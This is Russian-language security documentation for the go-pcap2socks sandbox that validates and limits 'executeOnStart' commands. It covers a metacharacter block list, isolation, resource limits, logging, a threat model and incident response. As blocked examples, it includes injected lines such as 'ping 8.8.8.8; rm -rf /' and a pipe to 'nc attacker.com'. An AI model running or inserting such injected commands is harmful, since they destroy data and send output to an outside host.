# Sandbox Security

## Обзор

go-pcap2socks использует sandbox для безопасного выполнения команд из `executeOnStart`. Это критически важная функция безопасности, которая защищает систему от command injection и ограничивает ресурсы выполняемых команд.

## Уровни защиты

### Уровень 1: Валидация конфигурации

**Что проверяется:**
- Команда в whitelist
- Отсутствие опасных символов в аргументах
- Валидность путей к исполняемым файлам

**Блокируемые паттерны:**
```
;  |  &  $  `  $(  ${  &&  ||  ../  \n  \r
```

**Пример:**
```go
// ❌ Заблокировано
"ping 8.8.8.8; rm -rf /"
"ping 8.8.8.8 | nc attacker.com"

// ✅ Разрешено
"ping -n 4 8.8.8.8"
"netsh interface show"
```

### Уровень 2: Изоляция процесса

**Windows:**
- Создание в новой группе процессов (`CREATE_NEW_PROCESS_GROUP`)
- Скрытие окна для GUI приложений
- Низкий приоритет процесса

**Linux/macOS:**
- Создание новой группы процессов (`setpgid`)
- Nice value для приоритета
- Ограничение через rlimit (планируется)

### Уровень 3: Ограничение ресурсов

**Таймауты:**
- По умолчанию: 30 секунд
- Автоматическое завершение при превышении
- Graceful shutdown через context

**Память:**
- Лимит: 256MB по умолчанию
- Платформо-зависимая реализация
- Предотвращение memory exhaustion

**CPU:**
- Лимит: 50% по умолчанию
- Через приоритет процесса
- Предотвращение CPU exhaustion

### Уровень 4: Мониторинг и логирование

**Что логируется:**
- Все выполненные команды
- Exit codes
- Время выполнения
- Использование ресурсов
- Ошибки и таймауты

**Пример логов:**
```
INFO Executing command in sandbox index=1 command="netsh interface show"
INFO Command executed successfully duration=245ms exit_code=0
WARN Command timed out command="ping -n 100 8.8.8.8" timeout=30s
ERROR Command failed command="invalid-cmd" error="command not allowed"
```

## Threat Model

### Защита от

1. **Command Injection**
   - Блокировка shell metacharacters
   - Whitelist разрешенных команд
   - Валидация аргументов

2. **Resource Exhaustion**
   - Таймауты на выполнение
   - Лимиты памяти
   - Лимиты CPU

3. **Privilege Escalation**
   - Выполнение с минимальными правами
   - Изоляция процессов
   - Ограничение доступа к файловой системе

4. **Information Disclosure**
   - Фильтрация вывода
   - Ограничение доступа к переменным окружения
   - Логирование без sensitive data

### НЕ защищает от

1. **Уязвимости в самих командах** - если `netsh` имеет уязвимость, sandbox не защитит
2. **Социальная инженерия** - если администратор добавит опасную команду в whitelist
3. **Kernel exploits** - sandbox работает на уровне userspace
4. **Hardware attacks** - физический доступ к системе

## Конфигурация безопасности

### Минимальная конфигурация (рекомендуется)

```json
{
  "executeOnStart": [
    "ipconfig /flushdns"
  ]
}
```

**Характеристики:**
- Одна команда
- Из whitelist
- Без аргументов с данными пользователя
- Быстрое выполнение (< 1s)

### Средняя конфигурация

```json
{
  "executeOnStart": [
    "netsh interface ip set dns name=Ethernet static 8.8.8.8",
    "ipconfig /flushdns",
    "ping -n 4 8.8.8.8"
  ]
}
```

**Характеристики:**
- Несколько команд
- Все из whitelist
- Статические аргументы
- Умеренное время выполнения (< 10s)

### Расширенная конфигурация (требует осторожности)

```json
{
  "executeOnStart": [
    "netsh interface ip set dns name=Ethernet static 8.8.8.8",
    "netsh interface ip add dns name=Ethernet 8.8.4.4 index=2",
    "route add 10.0.0.0 mask 255.0.0.0 192.168.1.1",
    "ipconfig /flushdns",
    "arp -d"
  ]
}
```

**Характеристики:**
- Много команд
- Изменение сетевых настроек
- Требует прав администратора
- Может занять время (< 30s)

## Аудит безопасности

### Checklist перед добавлением команды

- [ ] Команда действительно необходима?
- [ ] Команда в whitelist?
- [ ] Аргументы статические (не от пользователя)?
- [ ] Команда не требует интерактивного ввода?
- [ ] Команда завершается быстро (< 30s)?
- [ ] Команда не изменяет критичные настройки?
- [ ] Есть fallback при ошибке?
- [ ] Логируется выполнение?

### Регулярный аудит

**Ежемесячно:**
1. Проверить логи выполненных команд
2. Убедиться, что все команды необходимы
3. Проверить на новые уязвимости в используемых командах
4. Обновить whitelist при необходимости

**При изменениях:**
1. Code review изменений в executeOnStart
2. Тестирование в изолированной среде
3. Проверка логов после развертывания
4. Мониторинг метрик безопасности

## Incident Response

### При обнаружении подозрительной команды

1. **Немедленно:**
   - Остановить сервис
   - Проверить логи
   - Изолировать систему

2. **Анализ:**
   - Определить источник команды
   - Проверить config.json на изменения
   - Проанализировать последние коммиты

3. **Восстановление:**
   - Откатить config.json к известной хорошей версии
   - Обновить whitelist
   - Перезапустить сервис

4. **Постмортем:**
   - Документировать инцидент
   - Обновить процедуры
   - Улучшить мониторинг

### Примеры инцидентов

**Инцидент 1: Command Injection попытка**
```
ERROR Command validation failed error="dangerous argument pattern detected: ; rm -rf /"
```
**Действия:** Заблокировано автоматически, логирование, алерт администратору

**Инцидент 2: Timeout**
```
WARN Command timed out command="ping -n 1000 8.8.8.8" timeout=30s
```
**Действия:** Команда завершена, проверить необходимость такой команды

**Инцидент 3: Неразрешенная команда**
```
ERROR Command not allowed command="powershell -Command Get-Process"
```
**Действия:** Заблокировано, проверить config.json на несанкционированные изменения

## Best Practices

### DO ✅

1. Используйте минимальный whitelist
2. Логируйте все выполненные команды
3. Устанавливайте короткие таймауты
4. Регулярно проверяйте логи
5. Тестируйте в изолированной среде
6. Используйте статические аргументы
7. Документируйте необходимость каждой команды
8. Мониторьте метрики безопасности

### DON'T ❌

1. Не добавляйте `cmd`, `powershell`, `bash` в whitelist
2. Не передавайте пользовательский ввод в команды
3. Не отключайте валидацию
4. Не используйте бесконечные таймауты
5. Не игнорируйте ошибки выполнения
6. Не запускайте с правами root/admin без необходимости
7. Не храните sensitive data в аргументах команд
8. Не используйте executeOnStart для критичных операций
